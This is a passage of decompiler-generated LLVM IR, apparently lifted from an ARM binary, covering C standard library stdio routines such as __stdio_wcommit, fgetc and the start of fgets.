  %v3_17524 = add i32 %v0_17524, 4
  %v4_17524 = inttoptr i32 %v3_17524 to i32*
  %v5_17524 = load i32, i32* %v4_17524, align 4
  store i32 %v5_17524, i32* %r1.global-to-local, align 4
  %v6_17524 = add i32 %v0_17524, 8
  %v7_17524 = inttoptr i32 %v6_17524 to i32*
  %v8_17524 = load i32, i32* %v7_17524, align 4
  store i32 %v8_17524, i32* %r2.global-to-local, align 4
  %v1_1752c = load i32, i32* %r5.global-to-local, align 4
  %v2_1752c = add i32 %v1_1752c, 52
  %v3_1752c = inttoptr i32 %v2_1752c to i32*
  store i32 1, i32* %v3_1752c, align 4
  %v0_17530 = load i32, i32* %r5.global-to-local, align 4
  %v1_17530 = add i32 %v0_17530, 56
  store i32 %v1_17530, i32* %r3.global-to-local, align 4
  %v2_17534 = load i32, i32* %r0.global-to-local, align 4
  %v1_17538 = inttoptr i32 %v1_17530 to i32*
  store i32 %v2_17534, i32* %v1_17538, align 4
  %v3_17538 = add i32 %v0_17530, 60
  %v4_17538 = inttoptr i32 %v3_17538 to i32*
  %v5_17538 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17538, i32* %v4_17538, align 4
  %v6_17538 = add i32 %v0_17530, 64
  %v7_17538 = inttoptr i32 %v6_17538 to i32*
  %v8_17538 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17538, i32* %v7_17538, align 4
  %v0_1753c = load i32, i32* %r5.global-to-local, align 4
  %v1_1753c = add i32 %v0_1753c, 32
  %v2_1753c = inttoptr i32 %v1_1753c to i32*
  %v3_1753c = load i32, i32* %v2_1753c, align 4
  store i32 %v3_1753c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17540 = icmp eq i32 %v3_1753c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17548 = add i32 %v3_1753c, 56
  store i32 %v1_17548, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_17540, label %dec_label_pc_17554, label %dec_label_pc_174b8

dec_label_pc_17554:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_17558 = load i32, i32* %r7.global-to-local, align 4
  %v2_17558 = add i32 %v0_17558, 76
  %v3_17558 = inttoptr i32 %v2_17558 to i32*
  %v4_17558 = load i32, i32* %v3_17558, align 4
  store i32 %v4_17558, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_17558 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1757814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1757814, label %dec_label_pc_17580, label %dec_label_pc_17564

dec_label_pc_17564:                               ; preds = %dec_label_pc_17554, %dec_label_pc_17578
  %v1_1756c = phi i32 [ %storemerge, %dec_label_pc_17578 ], [ %storemerge12, %dec_label_pc_17554 ]
  %v1_17564 = inttoptr i32 %v1_1756c to i16*
  %v2_17564 = load i16, i16* %v1_17564, align 2
  %v3_17564 = zext i16 %v2_17564 to i32
  store i32 %v3_17564, i32* %r3.global-to-local, align 4
  %v1_17568 = and i32 %v3_17564, 64
  %v2_17568 = icmp eq i32 %v1_17568, 0
  br i1 %v2_17568, label %dec_label_pc_17578, label %bb39

bb39:                                             ; preds = %dec_label_pc_17564
  store i32 %v1_1756c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17578

dec_label_pc_17578:                               ; preds = %dec_label_pc_17564, %bb39
  %v1_17570 = xor i1 %v2_17568, true
  call void @__pseudo_cond_branch(i1 %v1_17570, i32 ptrtoint (i32* @global_var_175a8.648 to i32))
  %v0_17574 = load i32, i32* %r4.global-to-local, align 4
  %v1_17574 = add i32 %v0_17574, 32
  %storemerge.in = inttoptr i32 %v1_17574 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17578 = icmp eq i32 %storemerge, 0
  br i1 %v2_17578, label %dec_label_pc_17580, label %dec_label_pc_17564

dec_label_pc_17580:                               ; preds = %dec_label_pc_17578, %dec_label_pc_17554
  %v2_17584 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_17584, i32* %r4.global-to-local, align 4
  %v1_17588 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17588

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1753c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_174dc, { 1, 0 }
  uselistorder i32 %v4_1749c, { 2, 1, 0 }
  uselistorder i32 %v4_1746c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_17578, { 1, 0 }
  uselistorder label %dec_label_pc_17564, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_174fc, { 1, 0 }
  uselistorder label %dec_label_pc_174d8, { 1, 0 }
  uselistorder label %dec_label_pc_174b8, { 1, 0 }
}

define i32 @__stdio_wcommit(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_175a8 = load i32, i32* @r4, align 4
  store i32 %v3_175a8, i32* %stack_var_-8, align 4
  %v1_175ac = add i32 %arg1, 8
  %v2_175ac = inttoptr i32 %v1_175ac to i32*
  %v3_175ac = load i32, i32* %v2_175ac, align 4
  store i32 %v3_175ac, i32* @r1, align 4
  %v1_175b0 = add i32 %arg1, 16
  %v2_175b0 = inttoptr i32 %v1_175b0 to i32*
  %v3_175b0 = load i32, i32* %v2_175b0, align 4
  %v9_175b4 = icmp eq i32 %v3_175b0, %v3_175ac
  store i32 %arg1, i32* %r4.global-to-local, align 4
  br i1 %v9_175b4, label %bb3, label %bb

bb:                                               ; preds = %entry
  store i32 %v3_175ac, i32* %v2_175b0, align 4
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v1_175c0 = xor i1 %v9_175b4, true
  call void @__pseudo_cond_branch(i1 %v1_175c0, i32 ptrtoint (i32* @global_var_18f98.649 to i32))
  %v0_175c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_175c4 = add i32 %v0_175c4, 8
  %v2_175c4 = inttoptr i32 %v1_175c4 to i32*
  %v3_175c4 = load i32, i32* %v2_175c4, align 4
  %v1_175c8 = add i32 %v0_175c4, 16
  %v2_175c8 = inttoptr i32 %v1_175c8 to i32*
  %v3_175c8 = load i32, i32* %v2_175c8, align 4
  %v2_175cc = sub i32 %v3_175c8, %v3_175c4
  %v2_175d0 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_175d0, i32* @r4, align 4
  ret i32 %v2_175cc

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %bb3, { 1, 0 }
}

define i32 @__GI_fgetc(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_175d8 = load i32, i32* @r4, align 4
  store i32 %v3_175d8, i32* %stack_var_-20, align 4
  %v6_175d8 = load i32, i32* @r5, align 4
  %v9_175d8 = load i32, i32* @r6, align 4
  %v12_175d8 = load i32, i32* @r7, align 4
  %v15_175d8 = load i32, i32* @lr, align 4
  %v1_175dc = add i32 %arg1, 52
  %v2_175dc = inttoptr i32 %v1_175dc to i32*
  %v3_175dc = load i32, i32* %v2_175dc, align 4
  store i32 %v3_175dc, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_175e0 = icmp eq i32 %v3_175dc, 0
  store i32 %arg1, i32* @r7, align 4
  br i1 %v2_175e0, label %dec_label_pc_17614, label %dec_label_pc_175f0

dec_label_pc_175f0:                               ; preds = %entry
  %v1_175f0 = add i32 %arg1, 16
  %v2_175f0 = inttoptr i32 %v1_175f0 to i32*
  %v3_175f0 = load i32, i32* %v2_175f0, align 4
  store i32 %v3_175f0, i32* %r2.global-to-local, align 4
  %v1_175f4 = add i32 %arg1, 24
  %v2_175f4 = inttoptr i32 %v1_175f4 to i32*
  %v3_175f4 = load i32, i32* %v2_175f4, align 4
  store i32 %v3_175f4, i32* %r3.global-to-local, align 4
  %v3_175f8 = icmp uge i32 %v3_175f0, %v3_175f4
  store i1 %v3_175f8, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_175f8, label %dec_label_pc_17608, label %.thread

.thread:                                          ; preds = %dec_label_pc_175f0
  %v2_175fc = inttoptr i32 %v3_175f0 to i8*
  %v3_175fc = load i8, i8* %v2_175fc, align 1
  %v4_175fc = zext i8 %v3_175fc to i32
  store i32 %v4_175fc, i32* %r5.global-to-local, align 4
  %v6_175fc = add i32 %v3_175f0, 1
  store i32 %v6_175fc, i32* %r2.global-to-local, align 4
  store i32 %v6_175fc, i32* %v2_175f0, align 4
  br label %dec_label_pc_1770c

dec_label_pc_17608:                               ; preds = %dec_label_pc_175f0
  %v1_17608 = inttoptr i32 %arg1 to i16*
  %v2_17608 = call i32 @getc_unlocked(i16* %v1_17608)
  store i32 %v2_17608, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1770c

dec_label_pc_17614:                               ; preds = %entry
  %v0_17614 = call i32 @__aeabi_read_tp()
  %v0_17618 = load i32, i32* @r7, align 4
  %v1_17618 = add i32 %v0_17618, 64
  %v2_17618 = inttoptr i32 %v1_17618 to i32*
  %v3_17618 = load i32, i32* %v2_17618, align 4
  store i32 %v3_17618, i32* %r3.global-to-local, align 4
  %v1_1761c = add i32 %v0_17614, -1168
  store i32 %v1_1761c, i32* @r6, align 4
  %v3_17620 = icmp uge i32 %v3_17618, %v1_1761c
  store i1 %v3_17620, i1* %cpsr_c.global-to-local, align 1
  %v9_17620 = icmp eq i32 %v3_17618, %v1_1761c
  br i1 %v9_17620, label %dec_label_pc_17668, label %dec_label_pc_17628

dec_label_pc_17628:                               ; preds = %dec_label_pc_17614
  %v1_17628 = add i32 %v0_17618, 56
  store i32 %v1_17628, i32* @r5, align 4
  store i32 %v1_17628, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17634

dec_label_pc_17634:                               ; preds = %dec_label_pc_17640.dec_label_pc_17634_crit_edge, %dec_label_pc_17628
  %v0_17634 = phi i32 [ %v0_17634.pre, %dec_label_pc_17640.dec_label_pc_17634_crit_edge ], [ %v1_17628, %dec_label_pc_17628 ]
  %v1_17634 = inttoptr i32 %v0_17634 to i32*
  %v2_17634 = load i32, i32* %v1_17634, align 4
  store i32 %v2_17634, i32* %r3.global-to-local, align 4
  %v1_17638 = load i32, i32* @r4, align 4
  %v3_17638 = icmp uge i32 %v2_17634, %v1_17638
  store i1 %v3_17638, i1* %cpsr_c.global-to-local, align 1
  %v9_17638 = icmp eq i32 %v2_17634, %v1_17638
  br i1 %v9_17638, label %dec_label_pc_17640, label %dec_label_pc_17658

dec_label_pc_17640:                               ; preds = %dec_label_pc_17634
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17650 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17650, label %dec_label_pc_17654, label %dec_label_pc_17640.dec_label_pc_17634_crit_edge

dec_label_pc_17640.dec_label_pc_17634_crit_edge:  ; preds = %dec_label_pc_17640
  %v0_17634.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17634

dec_label_pc_17654:                               ; preds = %dec_label_pc_17640
  %v0_17654 = load i32, i32* @r4, align 4
  store i32 %v0_17654, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17658

dec_label_pc_17658:                               ; preds = %dec_label_pc_17634, %dec_label_pc_17654
  %v0_17658 = phi i32 [ %v0_17654, %dec_label_pc_17654 ], [ %v2_17634, %dec_label_pc_17634 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17658 = icmp eq i32 %v0_17658, 0
  br i1 %v2_17658, label %bb18, label %bb

bb:                                               ; preds = %dec_label_pc_17658
  br label %bb18

bb18:                                             ; preds = %dec_label_pc_17658, %bb
  store i32 95844, i32* @lr, align 4
  %v1_17660 = xor i1 %v2_17658, true
  call void @__pseudo_cond_branch(i1 %v1_17660, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_17664 = load i32, i32* @r6, align 4
  %v1_17664 = load i32, i32* @r7, align 4
  %v2_17664 = add i32 %v1_17664, 64
  %v3_17664 = inttoptr i32 %v2_17664 to i32*
  store i32 %v0_17664, i32* %v3_17664, align 4
  %v0_17668.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17668

dec_label_pc_17668:                               ; preds = %dec_label_pc_17614, %bb18
  %v1_17678 = phi i32 [ %v0_17618, %dec_label_pc_17614 ], [ %v0_17668.pre, %bb18 ]
  %v1_17668 = add i32 %v1_17678, 60
  %v2_17668 = inttoptr i32 %v1_17668 to i32*
  %v3_17668 = load i32, i32* %v2_17668, align 4
  store i32 %v3_17668, i32* %r2.global-to-local, align 4
  %v1_1766c = add i32 %v1_17678, 16
  %v2_1766c = inttoptr i32 %v1_1766c to i32*
  %v3_1766c = load i32, i32* %v2_1766c, align 4
  store i32 %v3_1766c, i32* @r1, align 4
  %v1_17670 = add i32 %v1_17678, 24
  %v2_17670 = inttoptr i32 %v1_17670 to i32*
  %v3_17670 = load i32, i32* %v2_17670, align 4
  store i32 %v3_17670, i32* %r3.global-to-local, align 4
  %v1_17674 = add i32 %v3_17668, 1
  store i32 %v1_17674, i32* %r2.global-to-local, align 4
  store i32 %v1_17674, i32* %v2_17668, align 4
  %v0_1767c = load i32, i32* @r1, align 4
  %v1_1767c = load i32, i32* %r3.global-to-local, align 4
  %v3_1767c = icmp uge i32 %v0_1767c, %v1_1767c
  store i1 %v3_1767c, i1* %cpsr_c.global-to-local, align 1
  br i1 %v3_1767c, label %dec_label_pc_1768c, label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17668
  %v2_17680 = inttoptr i32 %v0_1767c to i8*
  %v3_17680 = load i8, i8* %v2_17680, align 1
  %v4_17680 = zext i8 %v3_17680 to i32
  store i32 %v4_17680, i32* %r5.global-to-local, align 4
  %v6_17680 = add i32 %v0_1767c, 1
  store i32 %v6_17680, i32* @r1, align 4
  %v2_17684 = load i32, i32* @r7, align 4
  %v3_17684 = add i32 %v2_17684, 16
  %v4_17684 = inttoptr i32 %v3_17684 to i32*
  store i32 %v6_17680, i32* %v4_17684, align 4
  br label %dec_label_pc_17698

dec_label_pc_1768c:                               ; preds = %dec_label_pc_17668
  %v0_1768c = load i32, i32* @r7, align 4
  %v1_17690 = inttoptr i32 %v0_1768c to i16*
  %v2_17690 = call i32 @getc_unlocked(i16* %v1_17690)
  store i32 %v2_17690, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_17698

dec_label_pc_17698:                               ; preds = %.thread2, %dec_label_pc_1768c
  %v0_17698 = load i32, i32* @r7, align 4
  %v1_17698 = add i32 %v0_17698, 60
  %v2_17698 = inttoptr i32 %v1_17698 to i32*
  %v3_17698 = load i32, i32* %v2_17698, align 4
  %v1_1769c = add i32 %v3_17698, -1
  store i32 %v1_1769c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_176a0 = icmp eq i32 %v1_1769c, 0
  store i32 %v1_1769c, i32* %v2_17698, align 4
  br i1 %v2_176a0, label %dec_label_pc_176ac, label %dec_label_pc_1770c

dec_label_pc_176ac:                               ; preds = %dec_label_pc_17698
  %v0_176ac = load i32, i32* %r3.global-to-local, align 4
  %v1_176ac = load i32, i32* @r7, align 4
  %v2_176ac = add i32 %v1_176ac, 64
  %v3_176ac = inttoptr i32 %v2_176ac to i32*
  store i32 %v0_176ac, i32* %v3_176ac, align 4
  %v0_176b0 = load i32, i32* @r7, align 4
  %v1_176b0 = add i32 %v0_176b0, 56
  store i32 %v1_176b0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_176b4

dec_label_pc_176b4:                               ; preds = %dec_label_pc_176e4.dec_label_pc_176b4_crit_edge, %dec_label_pc_176ac
  %v0_176bc = phi i32 [ %v0_176bc.pre, %dec_label_pc_176e4.dec_label_pc_176b4_crit_edge ], [ %v1_176b0, %dec_label_pc_176ac ]
  %v0_176b4 = phi i32 [ %v0_176b4.pre, %dec_label_pc_176e4.dec_label_pc_176b4_crit_edge ], [ %v0_176b0, %dec_label_pc_176ac ]
  %v1_176b4 = add i32 %v0_176b4, 56
  %v2_176b4 = inttoptr i32 %v1_176b4 to i32*
  %v3_176b4 = load i32, i32* %v2_176b4, align 4
  store i32 %v3_176b4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_176bc, i32* %r2.global-to-local, align 4
  %v1_176c022 = inttoptr i32 %v0_176bc to i32*
  %v2_176c023 = load i32, i32* %v1_176c022, align 4
  store i32 %v2_176c023, i32* %r3.global-to-local, align 4
  %v3_176c425 = icmp uge i32 %v2_176c023, %v3_176b4
  store i1 %v3_176c425, i1* %cpsr_c.global-to-local, align 1
  %v9_176c431 = icmp eq i32 %v2_176c023, %v3_176b4
  br i1 %v9_176c431, label %dec_label_pc_176cc, label %dec_label_pc_176e4

dec_label_pc_176cc:                               ; preds = %dec_label_pc_176b4, %dec_label_pc_176cc.dec_label_pc_176c0_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_176dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_176dc, label %dec_label_pc_176e0, label %dec_label_pc_176cc.dec_label_pc_176c0_crit_edge

dec_label_pc_176cc.dec_label_pc_176c0_crit_edge:  ; preds = %dec_label_pc_176cc
  %v0_176c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_176c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_176c0 = inttoptr i32 %v0_176c0.pre to i32*
  %v2_176c0 = load i32, i32* %v1_176c0, align 4
  store i32 %v2_176c0, i32* %r3.global-to-local, align 4
  %v3_176c4 = icmp uge i32 %v2_176c0, %v1_176c4.pre
  store i1 %v3_176c4, i1* %cpsr_c.global-to-local, align 1
  %v9_176c4 = icmp eq i32 %v2_176c0, %v1_176c4.pre
  br i1 %v9_176c4, label %dec_label_pc_176cc, label %dec_label_pc_176e4

dec_label_pc_176e0:                               ; preds = %dec_label_pc_176cc
  %v0_176e0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_176e0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_176e4

dec_label_pc_176e4:                               ; preds = %dec_label_pc_176b4, %dec_label_pc_176cc.dec_label_pc_176c0_crit_edge, %dec_label_pc_176e0
  %v0_176ec = phi i32 [ %v0_176e0, %dec_label_pc_176e0 ], [ %v2_176c023, %dec_label_pc_176b4 ], [ %v2_176c0, %dec_label_pc_176cc.dec_label_pc_176c0_crit_edge ]
  %v1_176e4 = phi i32 [ %v0_176e0, %dec_label_pc_176e0 ], [ %v3_176b4, %dec_label_pc_176b4 ], [ %v1_176c4.pre, %dec_label_pc_176cc.dec_label_pc_176c0_crit_edge ]
  %v3_176e4 = icmp uge i32 %v0_176ec, %v1_176e4
  store i1 %v3_176e4, i1* %cpsr_c.global-to-local, align 1
  %v9_176e4 = icmp eq i32 %v0_176ec, %v1_176e4
  br i1 %v9_176e4, label %dec_label_pc_176ec, label %dec_label_pc_176e4.dec_label_pc_176b4_crit_edge

dec_label_pc_176e4.dec_label_pc_176b4_crit_edge:  ; preds = %dec_label_pc_176e4
  %v0_176b4.pre = load i32, i32* @r7, align 4
  %v0_176bc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_176b4

dec_label_pc_176ec:                               ; preds = %dec_label_pc_176e4
  %v2_176ec = icmp ne i32 %v1_176e4, 0
  store i1 %v2_176ec, i1* %cpsr_c.global-to-local, align 1
  %v7_176f0 = icmp slt i32 %v1_176e4, 2
  br i1 %v7_176f0, label %dec_label_pc_1770c, label %dec_label_pc_176f4

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176ec
  %v0_176f8 = load i32, i32* @r1, align 4
  %v1_176f8 = add i32 %v0_176f8, 129
  store i32 %v1_176f8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1770c

dec_label_pc_1770c:                               ; preds = %.thread, %dec_label_pc_17698, %dec_label_pc_176f4, %dec_label_pc_176ec, %dec_label_pc_17608
  %v0_1770c = load i32, i32* %r5.global-to-local, align 4
  %v2_17714 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_17714, i32* @r4, align 4
  store i32 %v6_175d8, i32* @r5, align 4
  store i32 %v9_175d8, i32* @r6, align 4
  store i32 %v12_175d8, i32* @r7, align 4
  store i32 %v15_175d8, i32* @lr, align 4
  ret i32 %v0_1770c

; uselistorder directives
  uselistorder i32 %v0_176e0, { 1, 0, 2 }
  uselistorder i32 %v1_176c4.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1767c, { 1, 0, 2 }
  uselistorder i32 %v1_17678, { 0, 2, 1 }
  uselistorder i32 %v1_17638, { 1, 0 }
  uselistorder i32 %v3_175f0, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 3, 0, 1, 2, 4 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 2, 13, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 11, 12, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 %arg1, { 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_1770c, { 2, 3, 1, 4, 0 }
  uselistorder label %dec_label_pc_176e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_176cc, { 1, 0 }
  uselistorder label %dec_label_pc_17698, { 1, 0 }
  uselistorder label %dec_label_pc_17668, { 1, 0 }
  uselistorder label %bb18, { 1, 0 }
  uselistorder label %dec_label_pc_17658, { 1, 0 }
}

define i32 @fgets(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_1771c = load i32, i32* @r4, align 4
  store i32 %v3_1771c, i32* %stack_var_-32, align 4
  %v6_1771c = load i32, i32* @r5, align 4
  %v9_1771c = load i32, i32* @r6, align 4
  %v12_1771c = load i32, i32* @r7, align 4
  %v15_1771c = load i32, i32* @r8, align 4
  %v24_1771c = load i32, i32* @lr, align 4
  %v1_17720 = add i32 %arg3, 52
  %v2_17720 = inttoptr i32 %v1_17720 to i32*
  %v3_17720 = load i32, i32* %v2_17720, align 4
  store i32 %v3_17720, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17724 = icmp eq i32 %v3_17720, 0
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg1, i32* %sl.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  br i1 %v2_17724, label %dec_label_pc_17738, label %dec_label_pc_1779c

dec_label_pc_17738:                               ; preds = %entry
  %v0_17738 = call i32 @__aeabi_read_tp()
  %v1_1773c = add i32 %arg3, 64
  %v2_1773c = inttoptr i32 %v1_1773c to i32*
  %v3_1773c = load i32, i32* %v2_1773c, align 4
  store i32 %v3_1773c, i32* %r3.global-to-local, align 4
  %v1_17740 = add i32 %v0_17738, -1168
  store i32 %v1_17740, i32* @r8, align 4
  %v3_17744 = icmp uge i32 %v3_1773c, %v1_17740
  store i1 %v3_17744, i1* %cpsr_c.global-to-local, align 1
  %v9_17744 = icmp eq i32 %v3_1773c, %v1_17740
  br i1 %v9_17744, label %dec_label_pc_17790, label %dec_label_pc_1774c

dec_label_pc_1774c:                               ; preds = %dec_label_pc_17738
  %v1_1774c = add i32 %arg3, 56
  store i32 %v1_1774c, i32* @r5, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_1774c, i32* %r2.global-to-local, align 4
  %v0_17758 = load i32, i32* @r6, align 4
  store i32 %v0_17758, i32* @r4, align 4
  %v1_1775c36 = inttoptr i32 %v1_1774c to i32*
  %v2_1775c37 = load i32, i32* %v1_1775c36, align 4
  store i32 %v2_1775c37, i32* %r3.global-to-local, align 4
  %v3_1776039 = icmp uge i32 %v2_1775c37, %v0_17758
  store i1 %v3_1776039, i1* %cpsr_c.global-to-local, align 1
  %v9_1776045 = icmp eq i32 %v2_1775c37, %v0_17758
  br i1 %v9_1776045, label %dec_label_pc_17768, label %dec_label_pc_17780

dec_label_pc_17768:                               ; preds = %dec_label_pc_1774c, %dec_label_pc_17768.dec_label_pc_1775c_crit_edge
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17778 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17778, label %dec_label_pc_1777c, label %dec_label_pc_17768.dec_label_pc_1775c_crit_edge

dec_label_pc_17768.dec_label_pc_1775c_crit_edge:  ; preds = %dec_label_pc_17768
  %v0_1775c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17760.pre = load i32, i32* @r4, align 4
  %v1_1775c = inttoptr i32 %v0_1775c.pre to i32*
  %v2_1775c = load i32, i32* %v1_1775c, align 4
  store i32 %v2_1775c, i32* %r3.global-to-local, align 4
  %v3_17760 = icmp uge i32 %v2_1775c, %v1_17760.pre
  store i1 %v3_17760, i1* %cpsr_c.global-to-local, align 1
  %v9_17760 = icmp eq i32 %v2_1775c, %v1_17760.pre
  br i1 %v9_17760, label %dec_label_pc_17768, label %dec_label_pc_17780

dec_label_pc_1777c:                               ; preds = %dec_label_pc_17768
  %v0_1777c = load i32, i32* @r4, align 4
  store i32 %v0_1777c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17780

dec_label_pc_17780:                               ; preds = %dec_label_pc_1774c, %dec_label_pc_17768.dec_label_pc_1775c_crit_edge, %dec_label_pc_1777c
  %v0_17780 = phi i32 [ %v0_1777c, %dec_label_pc_1777c ], [ %v2_1775c37, %dec_label_pc_1774c ], [ %v2_1775c, %dec_label_pc_17768.dec_label_pc_1775c_crit_edge ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17780 = icmp eq i32 %v0_17780, 0
  br i1 %v2_17780, label %bb20, label %bb

bb:                                               ; preds = %dec_label_pc_17780
  br label %bb20

bb20:                                             ; preds = %dec_label_pc_17780, %bb
  store i32 96140, i32* @lr, align 4
  %v1_17788 = xor i1 %v2_17780, true
  call void @__pseudo_cond_branch(i1 %v1_17788, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_1778c = load i32, i32* @r8, align 4
  %v1_1778c = load i32, i32* @r7, align 4
  %v2_1778c = add i32 %v1_1778c, 64
  %v3_1778c = inttoptr i32 %v2_1778c to i32*
  store i32 %v0_1778c, i32* %v3_1778c, align 4
  br label %dec_label_pc_17790

dec_label_pc_17790:                               ; preds = %dec_label_pc_17738, %bb20
  %v0_17790 = load i32, i32* @r7, align 4
  %v1_17790 = add i32 %v0_17790, 60
  %v2_17790 = inttoptr i32 %v1_17790 to i32*
  %v3_17790 = load i32, i32* %v2_17790, align 4
  %v1_17794 = add i32 %v3_17790, 1
  store i32 %v1_17794, i32* %r3.global-to-local, align 4
  store i32 %v1_17794, i32* %v2_17790, align 4
  %v0_1779c.pre = load i32, i32* %sl.global-to-local, align 4
  %v0_177a0.pre = load i32, i32* %sb.global-to-local, align 4
  %v0_177a4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_1779c

dec_label_pc_1779c:                               ; preds = %entry, %dec_label_pc_17790
  %v0_177a4 = phi i32 [ %arg3, %entry ], [ %v0_177a4.pre, %dec_label_pc_17790 ]
  %v0_177a0 = phi i32 [ %arg2, %entry ], [ %v0_177a0.pre, %dec_label_pc_17790 ]
  %v0_1779c = phi i32 [ %arg1, %entry ], [ %v0_1779c.pre, %dec_label_pc_17790 ]
  store i32 %v0_177a0, i32* %r1.global-to-local, align 4
  store i32 %v0_177a4, i32* %r2.global-to-local, align 4
  %v3_177a8 = inttoptr i32 %v0_1779c to i8*
  %v4_177a8 = call i32 @__GI_fgets_unlocked(i8* %v3_177a8, i32 %v0_177a0, i32 %v0_177a4)
